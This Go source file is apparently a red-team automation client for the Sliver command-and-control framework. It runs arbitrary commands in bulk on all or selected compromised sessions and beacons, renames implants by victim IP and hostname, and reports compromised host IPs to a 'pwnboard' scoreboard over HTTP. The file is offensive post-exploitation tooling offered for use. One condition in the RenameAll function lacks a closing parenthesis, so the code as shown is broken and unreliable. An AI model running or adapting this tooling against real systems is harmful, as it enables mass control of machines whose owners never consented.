package main

import (
	"bytes"
	"container/list"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func updatepwnBoard(ip string, urls string) {
	// Default URL if none is provided
	if urls == "" {
		urls = "http://127.0.0.1"
	}
	// Split the urls string into a slice of URLs
	urlList := strings.Split(urls, "^")

	for _, url := range urlList {
		// Append the endpoint to each URL
		finalUrl := url + "/pwn/boxaccess"
		// Create the struct
		data := PwnBoard{
			IPs:  ip,
			Type: "sliver",
		}

		// Marshal the data
		sendit, err := json.Marshal(data)
		if err != nil {
			fmt.Println("\n[-] ERROR SENDING POST:", err)
			continue // Skip this iteration and proceed with the next URL
		}

		// Send the post to pwnboard
		resp, err := http.Post(finalUrl, "application/json", bytes.NewBuffer(sendit))
		if err != nil {
			fmt.Println("[-] ERROR SENDING POST:", err)
			continue // Skip this iteration and proceed with the next URL
		}
		fmt.Println("POST sent to:", finalUrl, "Status Code:", resp.StatusCode)
		resp.Body.Close() // Close the response body on each iteration
	}
}

type task struct {
	taskid string
	beacon *clientpb.Beacon
}

func makeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}
func makeBeaconRequest(beacon *clientpb.Beacon) *commonpb.Request {
	if beacon == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		BeaconID: beacon.ID,
		Timeout:  timeout,
		Async:    true,
	}
}

func main() {
	var configPath, argsStr, hostsStr, sessionsStr, pwnboardurl, command string
	fs := flag.NewFlagSet("fs", flag.ContinueOnError)
	fs.StringVar(&command, "command", "", "command to run")
	fs.StringVar(&configPath, "config", "", "path to sliver client config file")
	fs.StringVar(&argsStr, "args", "", "command args")
	fs.StringVar(&hostsStr, "beacons", "", "runs command on list of beacons")
	fs.StringVar(&sessionsStr, "sessions", "", "runs command on list of sessions")
	fs.StringVar(&pwnboardurl, "url", "", "pwnboard's url")
	var cmdArgs []string
	//allow for any postion.
	subcommand := ""
	for _, arg := range os.Args[1:] {
		if !strings.HasPrefix(arg, "-") {
			subcommand = arg

		} else {
			cmdArgs = append(cmdArgs, arg)
		}
	}
	if err := fs.Parse(cmdArgs); err != nil {
		fmt.Println("Error parsing flags:", err)
		os.Exit(1)
	}

	args := strings.Split(argsStr, "^")
	hosts := strings.Split(hostsStr, " ")
	sessions := strings.Split(sessionsStr, " ")

	if configPath == "" {
		println("No config is provided --config would work, but attempting to guess based on what's in ~/.sliver-client/configs/")
		files, err := ioutil.ReadDir(os.Getenv("HOME") + "/.sliver-client/configs/")
		if err != nil {
			log.Fatal(err)
		}
		configPath = os.Getenv("HOME") + "/.sliver-client/configs/" + files[0].Name()
	}

	// Load the client configuration from the filesystem
	config, err := assets.ReadConfig(configPath)
	if err != nil {
		log.Fatal(err)
	}

	// Connect to the server
	rpc, ln, err := transport.MTLSConnect(config)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[*] Connected to sliver server")
	defer ln.Close()

	if len(os.Args) < 2 {
		fmt.Println("Expected 'rename', 'pwnboard','command'")
		os.Exit(1)
	}
	// subcommand := ""
	// //filter non positional arguments from the command line
	// for _, i := range os.Args {
	// 	if !strings.Contains(i, "--") {
	// 		subcommand = i
	// 	}
	// }

	switch subcommand {
	case "rename":
		RenameAll(rpc)
	case "pwnboard":
		SendToPwnBoard(rpc, pwnboardurl)
	case "command":
		if command == "" {
			fmt.Println("Expected 'command' with args")
			return
		}
		if sessionsStr != "" {
			RunCommandOnSessionList(rpc, command, args, sessions)
		} else if hostsStr != "" {
			RunCommandOnBeaconList(rpc, command, args, hosts)
		} else {
			RunCommandonAll(rpc, command, args)
		}
	}

}

func RunCommandOnSessionList(rpc rpcpb.SliverRPCClient, command string, args []string, hosts []string) {
	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	runon := []*clientpb.Session{}

	for i := 0; i < len(sessions.Sessions); i++ {
		if isinarray(hosts, sessions.Sessions[i].Name) {
			runon = append(runon, sessions.Sessions[i])
		}
	}
	//print(&agents.Sessions[i])
	//println(i)

	for i := 0; i < len(runon); i++ {
		runcommandon(rpc, command, runon[i], args)
	}

}

func RunCommandOnBeaconList(rpc rpcpb.SliverRPCClient, command string, args []string, hosts []string) {
	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	runon := []*clientpb.Beacon{}

	for i := 0; i < len(beacons.Beacons); i++ {
		if isinarray(hosts, beacons.Beacons[i].Name) {
			runon = append(runon, beacons.Beacons[i])
		}
	}
	//print(&agents.Sessions[i])
	//println(i)
	beacons.Beacons = runon
	runonbeacons(beacons, rpc, command, args)

}

func isinarray(hosts []string, host string) bool {
	for _, element := range hosts {
		if element == host {
			return true
		}
	}
	return false

}

func GetBeacons(rpc rpcpb.SliverRPCClient) {

	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < len(beacons.Beacons); i++ {
		fmt.Fprintf(os.Stdout, beacons.Beacons[i].Name+"\n")
	}
}

func GetSessions(rpc rpcpb.SliverRPCClient) {

	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < len(sessions.Sessions); i++ {
		fmt.Fprintf(os.Stdout, sessions.Sessions[i].Name+"\n")
	}
}

func RunCommandonAll(rpc rpcpb.SliverRPCClient, command string, args []string) {
	agents, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	//print(agents)
	for i := 0; i < len(agents.Sessions); i++ {
		//print(&agents.Sessions[i])
		if agents.Sessions[i].IsDead == true {
			println(agents.Sessions[i].Hostname + " is dead")
		} else {
			//println(i)
			runcommandon(rpc, command, agents.Sessions[i], args)
		}
	}
	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	//print(&agents.Sessions[i])
	//println(i)
	runonbeacons(beacons, rpc, command, args)
}
func RenameAll(rpc rpcpb.SliverRPCClient) {
	agents, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < len(agents.Sessions); i++ {
		ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
			Request: makeRequest(agents.Sessions[i]),
		})
		if err != nil {
			log.Print(err)
			continue
		}
		println(agents.Sessions[i].Name + "," + agents.Sessions[i].Hostname)
		for g := 0; g < len(ifconfig.NetInterfaces); g++ {
			if ifconfig.NetInterfaces[g].Name != "lo" {
				for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
					if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1" && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "127.0.0.1") {
						println(ifconfig.NetInterfaces[g].IPAddresses[k])
						ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
						ipaddr = strings.Split(ipaddr, "/")[0]
						name := ipaddr + "_" + agents.Sessions[i].Hostname + "."
						println(name)
						_, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
							SessionID: agents.Sessions[i].ID,
							Name:      name,
						})

						if err != nil {
							log.Print("Failed to decode task response: %s\n", err)

						}
					}
				}
			}
		}

	}

	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	taskids := list.New()
	for i := 0; i < len(beacons.Beacons); i++ {
		if beacons.Beacons[i].IsDead == true {
			println(beacons.Beacons[i].Hostname + " is dead")
		} else {

			ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
				Request: makeBeaconRequest(beacons.Beacons[i]),
			})
			if err != nil {
				log.Print(err)
			}
			taskids.PushFront(task{taskid: ifconfig.Response.TaskID, beacon: beacons.Beacons[i]})
		}
	}

	for k := 0; k < 100; k++ {
		if taskids.Front() == nil {
			continue
		}
		log.Println("waiting 10 seconds")
		time.Sleep(10 * time.Second)
		for i := taskids.Front(); i != nil; i = i.Next() {

			tasks, err := rpc.GetBeaconTasks(context.Background(), (i.Value).(task).beacon)

			if err != nil {
				log.Print(err)
			}
			for j := 0; j < len(tasks.Tasks); j++ {
				if tasks.Tasks[j].State == "completed" {
					if tasks.Tasks[j].ID == (i.Value).(task).taskid {
						resp, err := rpc.GetBeaconTaskContent(context.Background(), tasks.Tasks[j])
						if err != nil {
							log.Print(err)
						}
						oldval := i.Value
						old := i.Prev()
						if old == nil {
							println("HELP")
							if i.Next() == nil {
								taskids.Remove(i)
								i = nil
							} else {
								taskids.MoveToFront(i.Next())
								taskids.Remove(i)
								i = taskids.Front()
							}

						} else {
							taskids.Remove(i)
							i = old
						}

						ifconfig := &sliverpb.Ifconfig{}
						err = proto.Unmarshal(resp.Response, ifconfig)
						if err != nil {
							log.Print("Failed to decode task response: %s\n", err)

						}

						println((oldval).(task).beacon.Name + "," + (oldval).(task).beacon.Hostname)
						for g := 0; g < len(ifconfig.NetInterfaces); g++ {
							if ifconfig.NetInterfaces[g].Name != "lo" {
								for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
									if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
										println(ifconfig.NetInterfaces[g].IPAddresses[k])
										ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
										ipaddr = strings.Split(ipaddr, "/")[0]
										name := ipaddr + "_" + (oldval).(task).beacon.Hostname + "."
										if len(name) > 32 {
											name = name[:32] // Truncate to the first 32 characters
										}
										println(name)
										_, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
											BeaconID: (oldval).(task).beacon.ID,
											Name:     name,
										})

										if err != nil {
											log.Print("Failed to decode task response: %s\n", err)

										}
									}
								}
							}
						}
						//println(string(resp.Response))
					}
				}
			}
			if i == nil {
				println("i think i got everyone")
				break
			}
		}

	}
	for i := taskids.Front(); i != nil; i = i.Next() {
		println("didnt hear from " + (i.Value).(task).beacon.Name + "," + (i.Value).(task).beacon.Hostname)
	}

}
func SendToPwnBoard(rpc rpcpb.SliverRPCClient, url string) {
	agents, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < len(agents.Sessions); i++ {
		ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
			Request: makeRequest(agents.Sessions[i]),
		})
		if err != nil {
			log.Print(err)
			continue
		}
		println(agents.Sessions[i].Name + "," + agents.Sessions[i].Hostname)
		for g := 0; g < len(ifconfig.NetInterfaces); g++ {
			if ifconfig.NetInterfaces[g].Name != "lo" {
				for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
					if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
						println(ifconfig.NetInterfaces[g].IPAddresses[k])
						ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
						ipaddr = strings.Split(ipaddr, "/")[0]
						name := ipaddr + "_" + agents.Sessions[i].Hostname + "."
						println(name)

						// _, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
						// 	SessionID: agents.Sessions[i].ID,
						// 	Name:      name,
						//})
						updatepwnBoard(ipaddr, url)
						//todo upload to pwnboard
						if err != nil {
							log.Print("Failed to decode task response: %s\n", err)

						}
					}
				}
			}
		}

	}

	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	taskids := list.New()
	for i := 0; i < len(beacons.Beacons); i++ {
		if beacons.Beacons[i].IsDead == true {
			println(beacons.Beacons[i].Hostname + " is dead")
		} else {

			ifconfig, err := rpc.Ifconfig(context.Background(), &sliverpb.IfconfigReq{
				Request: makeBeaconRequest(beacons.Beacons[i]),
			})
			if err != nil {
				log.Print(err)
			}
			taskids.PushFront(task{taskid: ifconfig.Response.TaskID, beacon: beacons.Beacons[i]})
		}
	}

	for k := 0; k < 100; k++ {
		if taskids.Front() == nil {
			continue
		}
		log.Println("waiting 10 seconds")
		time.Sleep(10 * time.Second)
		for i := taskids.Front(); i != nil; i = i.Next() {

			tasks, err := rpc.GetBeaconTasks(context.Background(), (i.Value).(task).beacon)

			if err != nil {
				log.Print(err)
			}
			for j := 0; j < len(tasks.Tasks); j++ {
				if tasks.Tasks[j].State == "completed" {
					if tasks.Tasks[j].ID == (i.Value).(task).taskid {
						resp, err := rpc.GetBeaconTaskContent(context.Background(), tasks.Tasks[j])
						if err != nil {
							log.Print(err)
						}
						oldval := i.Value
						old := i.Prev()
						if old == nil {
							println("HELP")
							if i.Next() == nil {
								taskids.Remove(i)
								i = nil
							} else {
								taskids.MoveToFront(i.Next())
								taskids.Remove(i)
								i = taskids.Front()
							}

						} else {
							taskids.Remove(i)
							i = old
						}

						ifconfig := &sliverpb.Ifconfig{}
						err = proto.Unmarshal(resp.Response, ifconfig)
						if err != nil {
							log.Print("Failed to decode task response: %s\n", err)

						}

						println((oldval).(task).beacon.Name + "," + (oldval).(task).beacon.Hostname)
						for g := 0; g < len(ifconfig.NetInterfaces); g++ {
							if ifconfig.NetInterfaces[g].Name != "lo" {
								for k := 0; k < len(ifconfig.NetInterfaces[g].IPAddresses); k++ {
									if !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], ":") && !strings.Contains(ifconfig.NetInterfaces[g].IPAddresses[k], "172.17.0.1") {
										println(ifconfig.NetInterfaces[g].IPAddresses[k])
										ipaddr := ifconfig.NetInterfaces[g].IPAddresses[k]
										ipaddr = strings.Split(ipaddr, "/")[0]
										name := ipaddr + "_" + (oldval).(task).beacon.Hostname + "."
										println(name)
										// _, err := rpc.Rename(context.Background(), &clientpb.RenameReq{
										// 	BeaconID: (oldval).(task).beacon.ID,
										// 	Name:     name,
										// })

										updatepwnBoard(ipaddr, url)
										if err != nil {
											log.Print("Failed to decode task response: %s\n", err)

										}
									}
								}
							}
						}
						//println(string(resp.Response))
					}
				}
			}
			if i == nil {
				println("i think i got everyone")
				break
			}
		}

	}
	for i := taskids.Front(); i != nil; i = i.Next() {
		println("didnt hear from " + (i.Value).(task).beacon.Name + "," + (i.Value).(task).beacon.Hostname)
	}

}

//todo
// func SendToPwnBoardNoTouch(rpc rpcpb.SliverRPCClient, url string){
// 	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	for i := 0; i < len(sessions.Sessions); i++ {
// 		if sessions.Sessions[i].IsDead == true  {
// 			continue
// 		}
// 		if sessions.Sessions[i].LastCheckin.Seconds >0 {

// }
// return
// }
// }

func runonbeacons(beacons *clientpb.Beacons, rpc rpcpb.SliverRPCClient, command string, args []string) {
	taskids := list.New()
	for i := 0; i < len(beacons.Beacons); i++ {

		if beacons.Beacons[i].IsDead == true {
			println(beacons.Beacons[i].Hostname + " is dead")
		} else {

			taskids.PushFront(runcommandonbeacon(rpc, command, beacons.Beacons[i], args))
		}
	}
	for i := 0; i < 100; i++ {
		if taskids.Front() == nil {
			continue
		}
		log.Println("waiting 10 seconds")
		time.Sleep(10 * time.Second)
		for i := taskids.Front(); i != nil; i = i.Next() {
			tasks, err := rpc.GetBeaconTasks(context.Background(), (i.Value).(task).beacon)
			if err != nil {
				log.Print(err)
			}
			for j := 0; j < len(tasks.Tasks); j++ {
				if tasks.Tasks[j].State == "completed" {
					if tasks.Tasks[j].ID == (i.Value).(task).taskid {
						resp, err := rpc.GetBeaconTaskContent(context.Background(), tasks.Tasks[j])
						if err != nil {
							log.Print(err)
						}
						oldval := i.Value
						old := i.Prev()
						if old == nil {
							println("HELP")
							if i.Next() == nil {
								taskids.Remove(i)
								i = nil
							} else {
								taskids.MoveToFront(i.Next())
								taskids.Remove(i)
								i = taskids.Front()
							}

						} else {
							taskids.Remove(i)
							i = old
						}

						println((oldval).(task).beacon.Name + "," + (oldval).(task).beacon.Hostname)
						command := &sliverpb.Execute{}
						err = proto.Unmarshal(resp.Response, command)
						if err != nil {
							log.Print("Failed to decode task response: %s\n", err)

						}
						println(string(command.Stdout))
						println(string(command.Stderr))
					}
				}
			}
			if i == nil {
				println("i think i got everyone")
				break
			}
		}
	}
	for i := taskids.Front(); i != nil; i = i.Next() {
		println("didnt hear from " + (i.Value).(task).beacon.Name + "," + (i.Value).(task).beacon.Hostname)
	}
}

func isin(heardfrom *list.List, beacon *clientpb.Beacon) bool {

	return false
}

func runcommandonbeacon(rpc rpcpb.SliverRPCClient, command string, agent *clientpb.Beacon, args []string) task {

	// sess, err := rpc.OpenSession(context.Background(), &sliverpb.OpenSession{
	// 	Request: makeBeaconRequest(agent),
	// 	C2S:     []string{},
	// })
	// print(sess)
	// if err != nil {
	// 	log.Print(err)
	// 	return
	// }
	resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path:    command,
		Output:  true,
		Args:    args,
		Request: makeBeaconRequest(agent),
	})
	if err != nil {
		log.Print(err)
		return task{"err", agent}

	}

	println("Beacon:" + agent.Hostname)
	println("going to check back in with this beacon")
	return task{resp.Response.TaskID, agent}

}
func runcommandon(rpc rpcpb.SliverRPCClient, command string, agent *clientpb.Session, args []string) {
	resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path:    command,
		Output:  true,
		Request: makeRequest(agent),
		Args:    args,
	})
	if err != nil {
		log.Print(err)
		return
	}
	println("Session:" + agent.Hostname)
	println(string(resp.Stdout) + string(resp.Stderr))
}
func RunCommandOnNew(rpc rpcpb.SliverRPCClient, command string, args []string) {
	// Open the event stream to be able to collect all events sent by  the server
	eventStream, err := rpc.Events(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	// infinite loop
	for {
		event, err := eventStream.Recv()
		if err == io.EOF || event == nil {
			return
		}
		// Trigger event based on type
		switch event.EventType {

		// a new session just came in
		case consts.SessionOpenedEvent:
			session := event.Session
			// call any RPC you want, for the full list, see
			// https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
			runcommandon(rpc, command, session, args)
			//beacon fields not extracted so cannot impliment
			// case consts.BeaconRegisteredEvent:
			// 	beacon := event.Data
			// 	print(beacon)
			// 	runcommandonbeacon(rpc, command, clientpb.Beacon(beacon))
		}
	}
}
